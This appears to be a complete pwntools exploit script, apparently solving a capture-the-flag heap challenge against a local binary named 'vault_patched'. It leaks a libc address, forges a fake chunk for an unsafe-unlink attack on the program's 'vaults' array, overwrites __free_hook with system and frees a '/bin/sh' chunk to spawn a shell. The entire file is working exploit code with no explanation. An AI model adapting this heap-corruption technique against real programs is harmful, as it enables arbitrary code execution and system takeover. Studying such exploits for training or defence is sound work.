#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./vault_patched', checksec = False)
libc = elf.libc

def malloc(index):
    p.sendline(b'1')
    p.sendline(str(index).encode())
def edit(index, data):
    p.sendline(b'2')
    p.sendline(str(index).encode())
    p.sendline(data)
def free(index):
    p.sendline(b'3')
    p.sendline(str(index).encode())

p = process('./vault_patched')
p.recvuntil(b'0x')
leak = int(p.recvline().strip(), 16)
log.critical(f"Leak: {leak:#x}")
libc.address = leak - 0x6faf0
log.info(f"Libc base: {libc.address:#x}")

input()
malloc(0)
malloc(1)

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']
log.critical(f"Free hook: {free_hook:#x}")
log.critical(f"System: {system:#x}")
prev_size = 0x80
fake_size = 0x90
fd  = elf.sym.vaults-24
bk = elf.sym.vaults-0x10
log.critical(f"Fd: {fd:#x}")
log.critical(f"bk: {bk:#x}")

payload = p64(0) + p64(0x80)+ p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size)
edit(0, payload)
free(1)
edit(0, p64(0)*3 + p64(free_hook - 0x8))
edit(0,b'/bin/sh\0' + p64(system))
free(0)
p.interactive()
